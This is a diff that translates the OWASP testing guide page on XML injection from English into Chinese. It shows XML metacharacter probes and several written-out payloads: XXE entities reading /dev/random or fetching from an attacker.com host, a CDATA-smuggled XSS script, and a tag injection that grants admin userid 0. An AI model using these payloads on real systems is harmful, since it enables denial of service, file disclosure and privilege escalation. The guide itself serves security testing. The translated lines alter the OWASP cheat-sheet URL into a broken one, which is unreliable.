@@ -1,25 +1,25 @@
-# Testing for XML Injection
+# 测试XML注入
 
 |ID          |
 |------------|
 |WSTG-INPV-07|
 
-## Summary
+## 概述
 
-XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.
+XML注入测试是测试人员尝试将XML文档注入应用程序的方式。如果XML解析器未能对数据进行上下文验证，则测试将产生阳性结果。
 
-This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).
+本节描述XML注入的实际示例。首先，定义XML样式通信并解释其工作原理。然后是发现方法，在该方法中我们尝试插入XML元字符。一旦完成第一步，测试人员将获得有关XML结构的一些信息，因此可以尝试注入XML数据和标签（标签注入）。
 
-## Test Objectives
+## 测试目标
 
-- Identify XML injection points.
-- Assess the types of exploits that can be attained and their severities.
+- 识别XML注入点。
+- 评估可以获得的漏洞利用类型及其严重程度。
 
-## How to Test
+## 如何测试
 
-Let's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `user>`node in an `xmlDb` file.
+假设有一个Web应用程序使用XML样式通信来执行用户注册。这是通过在`xmlDb`文件中创建和添加新的`user>`节点来完成的。
 
-Let's suppose the xmlDB file is like the following:
+假设xmlDB文件如下：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -39,9 +39,9 @@ Let's suppose the xmlDB file is like the following:
 </users>
 ```
 
-When a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.
+当用户通过填写HTML表单注册自己时，应用程序接收用户的数据（为简单起见，假设以GET请求发送）。
 
-For example, the following values:
+例如，以下值：
 
 ```txt
 Username: tony
@@ -49,11 +49,11 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com
 ```
 
-will produce the request:
+将产生请求：
 
 `https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
 
-The application, then, builds the following node:
+然后，应用程序构建以下节点：
 
 ```xml
 <user>
@@ -64,7 +64,7 @@ The application, then, builds the following node:
 </user>
 ```
 
-which will be added to the xmlDB:
+将添加到xmlDB：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -90,47 +90,47 @@ which will be added to the xmlDB:
 </users>
 ```
 
-### Discovery
+### 发现
 
-The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.
+测试应用程序是否存在XML注入漏洞的第一步是尝试插入XML元字符。
 
-XML metacharacters are:
+XML元字符是：
 
-- Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.
+- 单引号：`'` - 如果不进行清理，当注入的值将成为标签中属性值的一部分时，此字符可能在XML解析期间抛出异常。
 
-As an example, let's suppose there is the following attribute:
+例如，假设有如下属性：
 
 `<node attrib='$inputValue'/>`
 
-So, if:
+所以，如果：
 
 `inputValue = foo'`
 
-is instantiated and then is inserted as the attrib value:
+被实例化然后作为attrib值插入：
 
 `<node attrib='foo''/>`
 
-then, the resulting XML document is not well formed.
+然后，生成的XML文档不是格式良好的。
 
-- Double quote: `"` - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.
+- 双引号：`"` - 此字符与单引号具有相同含义，如果属性值用双引号括起，则可以使用它。
 
 `<node attrib="$inputValue"/>`
 
-So if:
+所以如果：
 
 `$inputValue = foo"`
 
-the substitution gives:
+替换给出：
 
 `<node attrib="foo""/>`
 
-and the resulting XML document is invalid.
+生成的XML文档无效。
 
-- Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:
+- 尖括号：`>`和`<` - 通过在用户输入（如以下）中添加左或右尖括号：
 
 `Username = foo<`
 
-the application will build a new node:
+应用程序将构建新节点：
 
 ```xml
 <user>
@@ -141,13 +141,13 @@ the application will build a new node:
 </user>
 ```
 
-but, because of the presence of the open '<', the resulting XML document is invalid.
+但是，由于存在左`<'，生成的XML文档无效。
 
-- Comment tag: `<!--/-->` - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:
+- 注释标签：`<!--/-->` - 这组字符被解释为注释的开始/结束。因此，通过在Username参数中注入其中一个：
 
 `Username = foo<!--`
 
-the application will build a node like the following:
+应用程序将构建如下节点：
 
 ```xml
 <user>
@@ -158,23 +158,23 @@ the application will build a node like the following:
 </user>
 ```
 
-which won't be a valid XML sequence.
+这不是有效的XML序列。
 
-- Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.
+- 与号：`&`- 与号在XML语法中用于表示实体。实体的格式为`&symbol;`。实体映射到Unicode字符集中的字符。
 
-For example:
+例如：
 
 `<tagnode>&lt;</tagnode>`
 
-is well formed and valid, and represents the `<` ASCII character.
+格式良好且有效，表示`<` ASCII字符。
 
-If `&` is not encoded itself with `&amp;`, it could be used to test XML injection.
+如果`&`本身没有用`&amp;`编码，则可用于测试XML注入。
 
-In fact, if an input like the following is provided:
+实际上，如果提供如下输入：
 
 `Username = &foo`
 
-a new node will be created:
+将创建一个新节点：
 
 ```xml
 <user>
@@ -185,11 +185,11 @@ a new node will be created:
 </user>
 ```
 
-but, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.
+但是，文档再次无效：`&foo`未以`;`终止，`&foo;`实体未定义。
 
-- CDATA section delimiters: `<!\[CDATA\[ / ]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.
+- CDATA节分隔符：`<!\[CDATA\[ / ]]>` - CDATA节用于转义包含将被识别为标记的字符的文本块。换言之，封闭在CDATA节中的字符不被XML解析器解析。
 
-For example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:
+例如，如果需要表示字符串`<foo>`在文本节点中，可以使用CDATA节：
 
 ```xml
 <node>
@@ -197,25 +197,25 @@ For example, if there is the need to represent the string `<foo>` inside a text 
 </node>
 ```
 
-so that `<foo>` won't be parsed as markup and will be considered as character data.
+这样，`<foo>`不会被解析为标记，将被视为字符数据。
 
-If a node is created in the following way:
+如果节点以如下方式创建：
 
 `<username><![CDATA[<$userName]]></username>`
 
-the tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.
+测试人员可以尝试注入结束CDATA字符串`]]>`以尝试使XML文档无效。
 
 `userName = ]]>`
 
-this will become:
+这将变为：
 
 `<username><![CDATA[]]>]]></username>`
 
-which is not a valid XML fragment.
+这不是有效的XML片段。
 
-Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.
+另一个测试与CDATA标签有关。假设XML文档被处理以生成HTML页面。在这种情况下，CDATA节分隔符可能只是被消除，而不进一步检查其内容。然后，可以注入HTML标签，这些标签将包含在生成的页面中，完全绕过现有的清理例程。
 
-Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.
+让我们考虑一个具体示例。假设我们有一个包含一些文本的节点，将显示给用户。
 
 ```xml
 <html>
@@ -223,11 +223,11 @@ Let's consider a concrete example. Suppose we have a node containing some text t
 </html>
 ```
 
-Then, an attacker can provide the following input:
+然后，攻击者可以提供以下输入：
 
 `$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
 
-and obtain the following node:
+并获得以下节点：
 
 ```xml
 <html>
@@ -235,7 +235,7 @@ and obtain the following node:
 </html>
 ```
 
-During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:
+在处理过程中，CDATA节分隔符被消除，生成以下HTML代码：
 
 ```html
 <script>
@@ -243,11 +243,11 @@ During the processing, the CDATA section delimiters are eliminated, generating t
 </script>
 ```
 
-The result is that the application is vulnerable to XSS.
+结果是应用程序容易受到XSS。
 
-External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
+外部实体：有效实体的集合可以通过定义新实体进行扩展。如果实体的定义是URI，则该实体称为外部实体。除非配置为否则，外部实体强制XML解析器访问URI指定的资源，例如本地机器上的文件或远程系统上的文件。此行为向应用程序公开XML外部实体（XXE）攻击，可用于对本地系统执行拒绝服务、在本地机器上未经授权访问文件、扫描远程机器以及对远程系统执行拒绝服务。
 
-To test for XXE vulnerabilities, one can use the following input:
+要测试XXE漏洞，可以使用以下输入：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -256,9 +256,9 @@ To test for XXE vulnerabilities, one can use the following input:
         <foo>&xxe;</foo>
 ```
 
-This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.
+如果XML解析器尝试用/dev/random文件的内容替换实体，此测试可能会崩溃Web服务器（在UNIX系统上）。
 
-Other useful tests are the following:
+其他有用的测试如下：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -278,11 +278,11 @@ Other useful tests are the following:
         <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
-### Tag Injection
+### 标签注入
 
-Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
+完成第一步后，测试人员将获得有关XML文档结构的一些信息。然后可以尝试注入XML数据和标签。我们将展示一个可能导致权限提升的攻击示例。
 
-Let's considering the previous application. By inserting the following values:
+让我们考虑前面的应用程序。通过插入以下值：
 
 ```txt
 Username: tony
@@ -290,7 +290,7 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
 ```
 
-the application will build a new node and append it to the XML database:
+应用程序将构建一个新节点并将其附加到XML数据库：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -318,11 +318,11 @@ the application will build a new node and append it to the XML database:
 </users>
 ```
 
-The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.
+生成的XML文件格式良好。此外，对于用户tony，与userid标签关联的值可能是最后出现的值，即0（管理员ID）。换言之，我们注入了一个具有管理权限的用户。
 
-The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it.
+唯一的问题是userid标签在最后用户节点中出现了两次。通常，XML文档与模式或DTD相关联，如果不符合，将被拒绝。
 
-Let's suppose that the XML document is specified by the following DTD:
+让我们假设XML文档由以下DTD指定：
 
 ```xml
 <!DOCTYPE users [
@@ -335,9 +335,9 @@ Let's suppose that the XML document is specified by the following DTD:
 ]>
 ```
 
-Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.
+请注意，userid节点定义为基数1。在这种情况下，我们之前显示的攻击（以及其他简单攻击）将不起作用，如果XML文档在任何处理之前根据其DTD进行验证的话。
 
-However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:
+但是，如果测试人员控制与违规节点（userid，在本例中）之前某些节点的值，则可以解决此问题。实际上，测试人员可以通过注入注释开始/结束序列来注释掉该节点：
 
 ```txt
 Username: tony
@@ -345,7 +345,7 @@ Password: Un6R34kb!e</password><!--
 E-mail: --><userid>0</userid><mail>s4tan@hell.com
 ```
 
-In this case, the final XML database is:
+在这种情况下，最终XML数据库为：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -371,11 +371,11 @@ In this case, the final XML database is:
 </users>
 ```
 
-The original `userid` node has been commented out, leaving only the injected one. The document now complies with its DTD rules.
+原始`userid`节点已被注释掉，仅留下注入的节点。文档现在符合其DTD规则。
 
-## Source Code Review
+## 源代码审查
 
-The following Java API may be vulnerable to XXE if they are not configured properly.
+如果未正确配置，以下Java API可能容易受到XXE。
 
 ```text
 javax.xml.parsers.DocumentBuilder
@@ -399,28 +399,28 @@ XMLReader
 Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
 ```
 
-Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.
+检查源代码是否将docType、外部DTD和外部参数实体设置为禁止使用。
 
-- [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [XML外部实体（XXE）防范速查表](https://cheatseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 
-In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.
+此外，如果版本低于3.10.1，Java POI office阅读器可能容易受到XXE攻击。
 
-The version of POI library can be identified from the filename of the JAR. For example,
+可以从JAR的文件名识别POI库的版本。例如，
 
 - `poi-3.8.jar`
 - `poi-ooxml-3.8.jar`
 
-The followings source code keyword may apply to C.
+以下源代码关键字可能适用于C。
 
 - libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
 - libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
 
-## Tools
+## 工具
 
-- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
+- [XML注入模糊字符串（来自wfuzz工具）](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
 
-## References
+## 参考资料
 
-- [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)
-- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://www.securityfocus.com/archive/1/297714)
-- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [XML注入](https://www.whitehatsec.com/glossary/content/xml-injection)
+- [Gregory Steuck，"XXE（Xml外部实体）攻击"](https://www.securityfocus.com/archive/1/297714)
+- [OWASP XXE防范速查表](https://cheatseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
